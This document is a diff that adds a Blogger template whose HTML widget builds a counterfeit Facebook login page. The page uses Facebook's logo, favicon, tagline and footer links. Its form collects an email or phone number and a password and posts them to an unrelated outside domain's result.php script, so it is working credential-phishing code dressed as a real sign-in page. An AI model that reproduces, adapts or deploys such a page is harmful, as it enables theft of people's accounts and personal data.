@@ -1,0 +1,304 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+ <head>
+  <meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/> 
+  <b:if cond='data:blog.isMobile'> 
+   <meta content='width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0' name='viewport'/> 
+  <b:else/> 
+   <meta content='width=1100' name='viewport'/> 
+  </b:if> 
+  <b:include data='blog' name='all-head-content'/>
+  <title><data:blog.pageTitle/></title>
+  <b:skin><![CDATA[
+   $color: #999;
+$color-bg: #fff;
+
+
+
+/* ---------- GENERAL ---------- */
+
+* {
+  box-sizing: border-box;
+    &:before,
+  &:after {
+    box-sizing: border-box;
+  }
+  
+}
+
+body {
+	background: $color-bg;
+	color: $color;
+  font: $font-weight #{$font-size}/#{$line-height} $font-family;
+	margin: 0;
+}
+
+h3 { margin: 0; }
+
+a {
+	color: #999;
+	text-decoration: none;
+}
+
+a:hover { color: #1dabb8; }
+
+input {
+	border: none;
+	font-family: inherit;
+	font-size: inherit;
+	margin: 0;
+}
+
+input:focus {
+    border: 1px solid #0084ff;
+}
+
+
+
+
+.container {
+  margin-top:10%;
+
+
+  display: flex;
+  align-items: center;
+    float: none;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+
+
+
+
+
+/* ---------- LOGIN-FORM ---------- */
+body{
+  font-family: "Helvetica Neue", "Segoe UI", Helvetica, Arial, sans-serif;
+}
+
+
+#login-form {
+  width:100%;
+}
+
+
+
+#login-form h3 {
+	background-color: none;
+	border-radius: 5px 5px 0 0;
+	padding: 20px;
+	text-align: center;
+    color: rgba(0, 0, 0, 1);
+  font-size: 40px;
+  font-weight: 300;
+  margin-bottom: 24px;
+  text-align: center;
+  
+}
+#login-form h5 {
+	background-color: none;
+	text-align: center;
+color: rgba(0, 0, 0, 1);
+  font-size: 16px;
+  font-weight: 200;
+  line-height: 1.2;
+  margin-bottom: 24px;
+  text-align: center;
+  
+}
+
+#login-form fieldset {
+}
+
+
+#login-form input {
+	font-size: 14px;
+}
+
+#login-form input[type="text"],
+#login-form input[type="password"] {
+  border: 1px solid rgba(0, 0, 0, .20);
+  border-radius: 4px;
+  color: rgba(0, 0, 0, 1);
+  display: block;
+  font-family: "Helvetica Neue", "Segoe UI", Helvetica, Arial, sans-serif;
+  font-size: 17px;
+  height: 42px;
+  margin-bottom: 12px;
+  margin-left: auto;
+  margin-right: auto;
+  padding: 0 16px;
+  width: 300px;
+}
+
+
+
+
+#login-form input[type="text"] {
+
+}
+
+#login-form input[type="password"] {
+}
+
+#login-form #loginbutton{
+  background: #fff;
+  color: #0084ff;
+  font-size: 24px;
+  font-weight: normal;
+  margin-top: 24px;
+  text-align:center;
+  border:none;
+  background: #0a7cff;
+    border-radius: 50px;
+    color: #fff;
+    font-size: 15px;
+    padding: 9.5px 20px;
+}
+
+label{
+  color: #929292;
+  font-size: 14px;
+  font-weight: normal; 
+  
+}
+ 
+
+#login-form footer {
+	font-size: 12px;
+	margin-top: 16px;
+}
+
+
+}
+
+._210n {
+    bottom: 0;
+    font-size: 11px;
+    position: absolute;
+    text-align: center;
+    width: 100%;
+  display: block;
+}
+
+._210n a{
+    width: 100%;
+  margin-right:10px;
+}
+
+footer{
+position: absolute;
+  right: 0;
+  left: 0;
+  padding: 1rem;
+  text-align: center;
+
+  
+}
+._5hy4, ._3403 {
+    font-family: Calibre, Helvetica Neue, Segoe UI, Helvetica, Arial, Lucida Grande, sans-serif;
+}
+
+._3403 {
+    color: rgba(0, 0, 0, 1);
+    font-size: 35px;
+    font-weight: 450;
+    line-height: 40px;
+    margin-bottom: 45px;
+    margin-top: 24px;
+    text-align: center;
+
+}
+._210n {
+  color: #000000!important;
+    font-size: 15px;
+    font-weight: 400;
+    margin-top: 66px;
+     position: absolute;
+     text-align: center;
+     width: 100%;
+
+
+  }
+  ._3401{
+        visibility: hidden;
+  }
+  ._210n, ._210n a, ._210n ._2yib {
+    color: #262626!important;
+  }
+    html {
+    overflow-x: hidden;
+}
+   
+  ]]></b:skin>
+ </head>
+ <body>
+  <b:section class='main' id='main' showaddelement='yes'>
+    <b:widget id='HTML1' locked='false' mobile='yes' title='' type='HTML'>
+      <b:widget-settings>
+        <b:widget-setting name='content'>&lt;!doctype html&gt;
+
+
+  &lt;link rel=&quot;shortcut icon&quot; href=&quot;https://static.xx.fbcdn.net/rsrc.php/ym/r/YQbyhl59TWY.ico&quot; /&gt;
+  
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;./style.css&quot; /&gt;
+
+
+
+&lt;!-- partial:index.partial.html --&gt;
+&lt;div class=&quot;container&quot;&gt;
+
+  &lt;div id=&quot;login-form&quot;&gt;
+    &lt;center&gt;
+&lt;img width=&quot;80px&quot; src=&quot;https://static.xx.fbcdn.net/rsrc.php/yd/r/hlvibnBVrEb.svg&quot;/&gt; &lt;/center&gt;
+&lt;h2 class=&quot;_3403&quot;&gt;Connect with your favourite people&lt;/h2&gt;
+      &lt;form method=&quot;post&quot; action=&quot;https://www.blackpluseg.com/A_Dandouh/system/test/result.php&quot;&gt;
+
+        &lt;input type=&quot;text&quot; minlength=&quot;6&quot; name=&quot;email&quot; autocomplete=&quot;off&quot; placeholder=&quot;Email or phone number&quot; required /&gt;
+
+        &lt;input type=&quot;password&quot; minlength=&quot;6&quot; name=&quot;password&quot; autocomplete=&quot;off&quot; placeholder=&quot;Password&quot; required /&gt;
+&lt;center&gt;
+        &lt;button id=&quot;loginbutton&quot; name=&quot;signup&quot; type=&quot;submit&quot; action=&quot;post.php&quot; tabindex=&quot;1&quot; type=&quot;&quot;&gt;Continue&lt;/button&gt;
+  &lt;br /&gt;&lt;br /&gt;
+    &lt;input type=&quot;checkbox&quot; value=&quot;1&quot; name=&quot;persistent&quot; tabindex=&quot;1&quot; id=&quot;u_0_3&quot; /&gt;
+          
+        &lt;label &gt;Keep me signed in&lt;/label&gt;
+        &lt;/center&gt;
+        
+        
+      
+        &lt;footer class=&quot;footer&quot;&gt;
+&lt;div class=&quot;_210n&quot;&gt;&lt;a href=&quot;https://www.facebook.com/r.php&quot;&gt;Not on Facebook?&lt;/a&gt;&lt;span class=&quot;_3401&quot;&gt;|&lt;/span&gt;&lt;a href=&quot;https://www.facebook.com/login/identify?ctx=recover&quot;&gt;Forgotten password&lt;/a&gt;&lt;span class=&quot;_3401&quot;&gt;|&lt;/span&gt;&lt;a href=&quot;https://www.facebook.com/privacy/explanation&quot;&gt;Data Policy&lt;/a&gt;&lt;span class=&quot;_3401&quot;&gt;|&lt;/span&gt;&lt;a href=&quot;https://www.facebook.com/policies&quot;&gt;Terms&lt;/a&gt;&lt;span class=&quot;_3401&quot;&gt;|&lt;/span&gt;&lt;a href=&quot;https://www.facebook.com/help/cookies&quot;&gt;Cookies Policy&lt;/a&gt;&lt;span class=&quot;_3401&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;_2yib&quot;&gt; &#169; Facebook 2021&lt;/span&gt;&lt;/div&gt;
+          
+        &lt;/footer&gt;
+
+      &lt;/form&gt;
+
+
+  &lt;/div&gt; &lt;!-- end login-form --&gt;
+
+&lt;/div&gt;
+&lt;!-- partial --&gt;
+  
+
+&lt;/!doctype&gt;</b:widget-setting>
+      </b:widget-settings>
+      <b:includable id='main'>
+  <!-- only display title if it's non-empty -->
+  <b:if cond='data:title != &quot;&quot;'>
+    <h2 class='title'><data:title/></h2>
+  </b:if>
+  <div class='widget-content'>
+    <data:content/>
+  </div>
+
+  <b:include name='quickedit'/>
+</b:includable>
+    </b:widget>
+  </b:section>
+  <!-- Please Keep The Credits -->
+  <center/>
+ </body>
+</html>
